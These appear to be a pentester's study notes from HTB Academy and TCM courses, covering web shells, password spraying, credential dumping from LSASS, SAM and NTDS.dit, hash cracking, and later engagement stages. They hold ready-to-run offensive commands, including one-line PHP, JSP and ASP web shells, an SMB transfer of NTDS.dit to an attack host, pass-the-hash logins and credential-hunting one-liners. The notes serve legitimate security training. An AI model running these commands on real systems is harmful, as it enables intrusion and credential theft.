- Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

#### PHP Web shell

```php
<?php system($_REQUEST["cmd"]); ?>
```

#### JSP webshell

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### ASP webshell

```c#
<% eval request("cmd") %>
```

#### Where to upload it

|Web Server|Default Webroot|
|----------|---------------|
|Apache|`/var/www/html/`|
|Nginx|`/usr/local/nginx/html/`|
|IIS|`c:\inetpub\wwwroot\`|
|XAMPP|`C:\xampp\htdocs\`|

- `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php` bash command for an Apache web server on linux
- To access it `shell.php?cmd=id` with the browser
- `curl http://SERVER_IP:PORT/shell.php?cmd=id` with the command line

## Payloads

![image](https://user-images.githubusercontent.com/96747355/175836279-e0f0e004-c75a-4d8e-b4de-9680e1b5306a.png)  

> *Source:[TCM Academy](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)*

- If one type of payload does not work we can try the other one

## Bruteforce attacks

- Check out how to use Hydra 
- We can also use metasploit that has multiple modules for bruteforce attacks

## Credentials stuffing and password spraying

- Methodology
  - Use leaked creds found during the enumeration phase on the login portals found during the enumeration phase
- The goal of credentials stuffing and password spraying is to taking these credentials and throwing them at a website
- We can use burp intruder for this
  - First we can see what we get when a login fails, and copy the string we get back
  - We send the login portal to intruder and we add the login and password as variables
  - We use a pitchfork attack
  - We make a grep-match on the string previously copied 
  - Then in the payloads we take the list of users for the variable that corresponds to user and the list of passwords for the one that corresponds to the password. And then we just launch the attack.
  - In the results we will see the ones that are not valid with our grep match. We can also check the response (301 is redirect for example) and the size of the paylaod (if it is really different in one of the results
- Password spraying: We can also try an attack with one password and try out multiple usernames
  - Caution here, checkout prior to your engagement if a lockout is in place how many tried before being locked out. When we know this we can then setup our attack to try something every hour or so.

## Possible paths after this step

|Path |Description|
|-----|-----------|
|Information Gathering| Once we have initial access to the target system, regardless of how high our privileges are at that moment, we need to gather information about the local system. Whether we use this new information for privilege escalation, lateral movement, or data exfiltration does not matter. Therefore, before we can take any further steps, we need to find out what we are dealing with. This inevitably takes us to the vulnerability assessment stage, where we analyze and evaluate the information we find.|
|Post-Exploitation| Post-exploitation is mainly about escalating privileges if we have not yet attained the highest possible rights on the target host. As we know, more opportunities are open to us with higher privileges. This path actually includes the stages Information Gathering, Vulnerability Assessment, Exploitation, and Lateral Movement but from an internal perspective on the target system. The direct jump to post-exploitation is less frequent, but it does happen. Because through the exploitation stage, we may already have obtained the highest privileges, and from here on, we start again at Information Gathering.|
|Lateral Movement|From here, we can also skip directly over to Lateral Movement. This can come under different conditions. If we have achieved the highest privileges on a dual-homed system used to connect two networks, we can likely use this host to start enumerating hosts that were not previously available to us.|
|Proof-of-Concept| We can take the last path after gaining the highest privileges by exploiting an internal system. Of course, we do not necessarily have to have taken over all systems. However, if we have gained the Domain Admin privileges in an Active Directory environment, we can likely move freely across the entire network and perform any actions we can imagine. So we can create the Proof-of-Concept from our notes to detail and potentially automate the paths and activities and make them available to the technical department.|

> *Source: HTB Academy*

## Resources

- https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
- https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course





# Password attacks

> Notes from [HTB Academy Password Attacks course](https://academy.hackthebox.com)

## Linux auth process

### Shadow file

- `/etc/shadow`

| `csbygb:`|`$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:`|`18955:`|`0:`|`99999:`|`7:`|`:`|`:`|`:`|
|----|----|---|---|----|----|---|----|----|
|`<username>:`|`<encrypted password>:`|`<day of last change>:`|`<min age>:`|`<max age>:`|`<warning period>:`|`<inactivity period>:`|`<expiration date>:`|`<reserved field>`|

- Encryption of password in shadow

|`$ <id>`|`$ <salt>`|`$ <hashed>`|
|--------|----------|------------|
|`$ y`|`$ j9T`|`$ 3QSBB6CbHEu...SNIP...f8Ms`|

The type (id) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.  

|ID|Cryptographic Hash Algorithm|
|--|----------------------------|
|`$1$`|[MD5](https://en.wikipedia.org/wiki/MD5)|
|`$2a$`|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))|
|`$5$`|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|`$6$`|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|`$sha1$`|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|`$y$`|[Yescrypt](https://github.com/openwall/yescrypt)|
|`$gy$`|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|`$7$`|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

The other two files are `/etc/passwd` and `/etc/group`. In the past, the encrypted password was stored together with the username in the `/etc/passwd` file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The `/etc/shadow` file can only be read by the user root.  

### Passwd file

|`csbygb:`|`x:`|`1000:`|`1000:`|`,,,:`|`/home/csbygb:`|`/bin/bash`|
|---------|----|-------|-------|------|---------------|-----------|
|`<username>:`|`<password>:`|`<uid>:`|`<gid>:`|`<comment>:`|`<home directory>:`|`<cmd executed after logging in>`|

The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file. However, the redirection to the `/etc/shadow` file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user root does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.  

## Windows auth process

The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (LSA) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (SIDs).  

The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.  


Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (LogonUI), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

Winlogon is a trusted process responsible for managing security-related user interactions. These include:

- Launching LogonUI to enter passwords at login
- Changing passwords
- Locking and unlocking the workstation

It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are COM objects that are located in DLLs.

Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

### LSASS

[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (LSASS) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN).

|Authentication Packages|Description|
|-----------------------|-----------|
|`Lsasrv.dll`|The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|`Msv1_0.dll`|Authentication package for local machine logons that don't require custom authentication.|
|`Samsrv.dll`|The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|`Kerberos.dll`|Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|`Netlogon.dll`|Network-based logon service.|
|`Ntdsa.dll`|This library is used to create new records and folders in the Windows registry.|

Each interactive logon session creates a separate instance of the Winlogon service.  
The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (GINA) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

#### Attacking LSASS

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log

##### Dumping LSASS Process Memory

- With Task Manager (requires GUI access)



A file `lsass.DMP` will be in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`

- With Rundll32.exe & Comsvcs.dll

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

- `tasklist /svc` from cmd
- `Get-Process lsass` from powershell
- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` lsass dump with powershell

#### Using Pypykatz to Extract Credentials

- Install pypykatz

```bash
mkdir pypykatz
python3 -m venv .
source bin/activate
pip install pypykatz
```

- `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`

### SAM Database

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (SAM) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in `%SystemRoot%\ntds.dit`.

Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.  


Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's Credential Locker. Credentials are encrypted and stored in `C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`  

#### Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes.  

|Registry Hive|Description|
|-------------|-----------|
|hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

We can create backups of these hives using the `reg.exe` utility.  

- `reg.exe save hklm\sam C:\sam.save`
- `reg.exe save hklm\system C:\system.save`
- `reg.exe save hklm\security C:\security.save`

#### Dumping Hashes with Impacket's secretsdump.py

- `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

### Running Hashcat against NT hashes

- `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`

### Dumping LSA Secrets Remotely

- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`

### Dumping SAM Remotely

- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

### NTDS

It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called NTDS.dit that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

## Attack Methods

### Dictionary Attacks

Dictionary attacks involve using a pre-generated list of words and phrases (known as a dictionary) to attempt to crack a password. This list of words and phrases is often acquired from various sources, such as publicly available dictionaries, leaked passwords, or even purchased from specialized companies. The dictionary is then used to generate a series of strings which are then used to compare against the hashed passwords. If a match is found, the password is cracked, providing an attacker access to the system and the data stored within it. This type of attack is highly effective. Therefore, it is essential to take the necessary steps to ensure that passwords are kept secure, such as using complex and unique passwords, regularly changing them, and using two-factor authentication.  

When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:  

|Username Convention|Practical Example for Jane Jill Doe|
|-------------------|-----------------------------------|
|firstinitiallastname|jdoe|
|firstinitialmiddleinitiallastname|jjdoe|
|firstnamelastname|janedoe|
|firstname.lastname|jane.doe|
|lastname.firstname|doe.jane|
|nickname|doedoehacksstuff|

> A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith.  
> Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.  

- `./username-anarchy -i names.txt` convert a list of real names into common usernames formats.
- `NetExec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt` dictionnary attack with NetExec

### Capturing NTDS.dit

NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest.  
This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.  

#### Creating Shadow Copy of C:

We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. 

- `PS C:\> vssadmin CREATE SHADOW /For=C:`
- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` Copying NTDS.dit from the VSS
- `PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData` Transferring NTDS.dit to Attack Host

#### A Faster Method: Using cme to Capture NTDS.dit

- `NetExec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds` This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

### Cracking Hashes & Gaining Credentials

- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt` Cracking a Single Hash with Hashcat
- `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"` pass the hash with evil-winrm  

### Credential Hunting in Windows

> Here we assume that we have gained access to an IT admin's Windows 10 workstation through RDP.

#### Keyterms to search

- Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials.

#### Tools

- [Lazagne](https://github.com/AlessandroZ/LaZagne)  
  - `start lazagne.exe all` execute Lazagne and run all included modules. We can include the option -vv to study what it is doing in the background.  
- findstr
  - `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

#### Other places to keep in mind

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

### Brute Force Attacks

Brute force attacks involve attempting every conceivable combination of characters that could form a password. This is an extremely slow process, and using this method is typically only advisable if there are no other alternatives. It is also important to note that the longer and more complex the password, the more difficult it is to crack and the longer it will take to exhaust every combination. For this reason, it is highly recommended that passwords be at least 8 characters in length, with a combination of letters, numbers, and symbols.

### Rainbow Table Attacks

Rainbow table attacks involve using a pre-computed table of hashes and their corresponding plaintext passwords, which is a much faster method than a brute-force attack. However, this method is limited by the rainbow table size – the larger the table, the more passwords, and hashes it can store. Additionally, due to the nature of the attack, it is impossible to use rainbow tables to determine the plaintext of hashes not already included in the table. As a result, rainbow table attacks are only effective against hashes already present in the table, making the larger the table, the more successful the attack.

## Linux Local Password Attacks

### Credential hunting in Linux

|Files|History|Memory|Key-Rings|
|-----|-------|------|---------|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing|
|Notes|
|Scripts|
|Source codes|
|Cronjobs|
|SSH Keys|

|Log File|Description|
|--------|-----------|
|/var/log/messages|Generic system activity logs.|
|/var/log/syslog|Generic system activity logs.|
|/var/log/auth.log|(Debian) All authentication related logs.|
|/var/log/secure|(RedHat/CentOS) All authentication related logs.|
|/var/log/boot.log|Booting information.|
|/var/log/dmesg|Hardware and drivers related information and logs.|
|/var/log/kern.log|Kernel related warnings, errors and logs.|
|/var/log/faillog|Failed login attempts.|
|/var/log/cron|Information related to cron jobs.|
|/var/log/mail.log|All mail server related logs.|
|/var/log/httpd|All Apache related logs.|
|/var/log/mysqld.log|All MySQL server related logs.|

- `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done` seach for configuration files
- `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done` search for "user", "password" and "pass" in all cnf files
- `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done` search for database files
- `find /home/* -type f -name "*.txt" -o ! -name "*.*"` search for files including the .txt file extension and files that have no file extension at all
- `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done` search for scripts
- `cat /etc/crontab` `ls -la /etc/cron.*/` search for cron jobs (might contain creds)
- `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"` search for ssh private keys
- `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"` search for ssh public keys
- `tail -n5 /home/*/.bash*` search for files with .bash in the name
- `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done` search for specific strings (accepted session opened session closed failure failed ssh password changed new user delete user sudo COMMAND= logs) in log files

#### mimipenguin

> Requires root privileges

- [Repo of mimipenguin](https://github.com/huntergregal/mimipenguin)

- `sudo python3 mimipenguin.py` or `sudo bash mimipenguin.sh`

#### Lazagne

- `sudo python2.7 laZagne.py all`

#### Credentials in Browsers

- `ls -l .mozilla/firefox/ | grep default` search for firefox files with credentials
- `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .` print mozzilla creds file
- `python3 laZagne.py browsers` with lazagne

##### Firefox decrypt

- [Repo](https://github.com/unode/firefox_decrypt)
- `python3.9 firefox_decrypt.py` Decrypting Firefox Credentials

### Passwd,Shadow & Opasswd

#### Passwd

If we change `root:x:0:0:root:/root:/bin/bash` for `root::0:0:root:/root:/bin/bash` root wont require a password if we use `su`

#### Shadow File

The format of this file is divided into nine fields:

```bash
cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
```

|Username|Encrypted password|Last PW change|Min. PW age|Max. PW age|Warning period|Inactivity period|Expiration date|Unused|
|----|---|-|-|-|-|-|-|-|
|`cry0l1t3`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`18937`|`0`|`99999`|`7`|||

If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:

`$<type>$<salt>$<hashed>`

Algorithm Types

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

#### Opasswd

The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

- `sudo cat /etc/security/opasswd`

### Cracking Linux Credentials

#### Unshadow

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes

- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`

#### Hashcat - Cracking MD5 Hashes

- `cat md5-hashes.list`
- `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`

## Resources

- [Linux User Auth](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf)
- [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
- [Passwords, Hashes and wordlist tools](https://csbygb.gitbook.io/pentips/tools/passwords-tools)  
- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)







# Post Exploitation

In most cases, when we exploit certain services for our purposes to gain access to the system, we usually do not obtain the highest possible privileges.  
Because services are typically configured in a certain way "isolated" to stop potential attackers, bypassing these restrictions is the next step we take in this stage.  
However, it is not always easy to escalate the privileges. After gaining in-depth knowledge about how these operating systems function, we must adapt our techniques to the particular operating system and carefully study how Linux Privilege Escalation and Windows Privilege Escalation work.  

At this stage of the penetration test, we already have access to the exploited machine and ensure that we still have access to it even if modifications and changes are made. During this phase, we may try to escalate our privileges to obtain the highest possible rights and hunt for sensitive data such as credentials or other data that the client is concerned with protecting (pillaging). Sometimes we perform post-exploitation to demonstrate to a client the impact of our access. Other times we perform post-exploitation as an input to the lateral movement process described next.

*Source HTB Academy*

## Possible paths after this step

|Path|Description|
|----|-----------|
|Information Gathering / Pillaging|Before we can begin escalating privileges, we must first get an overview of the inner workings of the exploited system. After all, we do not know which users are on the system and what options are available to us up to this point. This step is also known as Pillaging. This path is not optional, as with the others, but essential. Again, entering the Information Gathering stage puts us in this perspective. This inevitably takes us to the vulnerability assessment stage, where we analyze and evaluate the information we find.|
|Exploitation|Suppose we have found sensitive information about the system and its' contents. In that case, we can use it to exploit local applications or services with higher privileges to execute commands with those privileges.|
|Lateral Movement|From here, we can also skip directly over to Lateral Movement. This can come under different conditions. If we have achieved the highest privileges on a dual-homed system used to connect two networks, we can likely use this host to start enumerating hosts that were not previously available to us.|
|Proof-of-Concept|We can take the last path after gaining the highest privileges by exploiting an internal system. Of course, we do not necessarily have to have taken over all systems. However, if we have gained the Domain Admin privileges in an Active Directory environment, we can likely move freely across the entire network and perform any actions we can imagine. So we can create the Proof-of-Concept from our notes to detail and potentially automate the paths and activities and make them available to the technical department.|

*Source HTB Academy*

## Resources

- https://academy.hackthebox.com/login





# Lateral Movement

Lateral movement is one of the essential components for moving through a corporate network. We can use it to overlap with other internal hosts and further escalate our privileges within the current subnet or another part of the network. However, just like Pillaging, the Lateral Movement stage requires access to at least one of the systems in the corporate network. In the Exploitation stage, the privileges gained do not play a critical role in the first instance since we can also move through the network without administrator rights.  

Lateral movement describes movement within the internal network of our target company to access additional hosts at the same or a higher privilege level. It is often an iterative process combined with post-exploitation activities until we reach our goal. For example, we gain a foothold on a web server, escalate privileges and find a password in the registry. We perform further enumeration and see that this password works to access a database server as a local admin user. From here, we can pillage sensitive data from the database and find other credentials to further our access deeper into the network. In this stage, we will typically use many techniques based on the information found on the exploited host or server.
*Source HTB Academy*

## Possible paths after this step

|Path|Description|
|----|-----------|
|Vulnerability Assessment|If the penetration test is not finished yet, we can jump from here to the Vulnerability Assessment stage. Here, the information already obtained from pillaging is used and analyzed to assess where the network services or applications using an authentication mechanism that we may be able to exploit are running.|
|Information Gathering / Pillaging|After a successful lateral movement, we can jump into Pillaging once again. This is local information gathering on the target system that we accessed.|
|Proof-of-Concept|Once we have made the last possible lateral movement and completed our attack on the corporate network, we can summarize the information and steps we have collected and perhaps even automate certain sections that demonstrate vulnerability to the vulnerabilities we have found.|  

*Source HTB Academy*

## Resources

- https://academy.hackthebox.com/login






# Proof of Concept

The Proof-Of-Concept (POC) is merely proof that a vulnerability found exists. As soon as the administrators receive our report, they will try to confirm the vulnerabilities found by reproducing them. After all, no administrator will change business-critical processes without confirming the existence of a given vulnerability. A large network may have many interoperating systems and dependencies that must be checked after making a change, which can take a considerable amount of time and money. Just because a pentester found a given flaw, it doesn't mean that the organization can easily remediate it by just changing one system, as this could negatively affect the business. Administrators must carefully test fixes to ensure no other system is negatively impacted when a change is introduced. PoCs are sent along with the documentation as part of a high-quality penetration test, allowing administrators to use them to confirm the issues themselves.  

In this stage, we document, step-by-step, the steps we took to achieve network compromise or some level of access. Our goal is to paint a picture of how we were able to chain together multiple weaknesses to reach our goal so they can see a clear picture of how each vulnerability fits in and help prioritize their remediation efforts. If we don't document our steps well, it's hard for the client to understand what we were able to do and, thus, makes their remediation efforts more difficult. If feasible, we could create one or more scripts to automate the steps we took to assist our client in reproducing our findings.  
*Source HTB Academy*

## Next step

- Post-Engagement: At this point, we can only go to the post-engagement stage, where we optimize and improve the documentation and send it to the customer after an intensive review.

*Source HTB Academy*

## Resources

- https://academy.hackthebox.com/login




# Post-Engagement

The Post-Engagement stage also includes cleaning up the systems we exploit so that none of these systems can be exploited using our tools. For example, leaving a bind shell on a web server that does not require authentication and is easy to find will do the opposite of what we are trying to do. In this way, we endanger the network through our carelessness.  
Therefore, it is essential to remove all content that we have transferred to the systems during our penetration test so that the corporate network is left in the same state as before our penetration test.  
We also should note down any system changes, successful exploitation attempts, captured credentials, and uploaded files in the appendices of our report so our clients can cross-check this against any alerts they receive to prove that they were a result of our testing actions and not an actual attacker in the network.  

In addition, we have to reconcile all our notes with the documentation we have written in the meantime to make sure we have not skipped any steps and can provide a comprehensive, well-formatted and neat report to our clients.  

> *Source: Hackthebox Academy*



## Resources

- https://academy.hackthebox.com/login




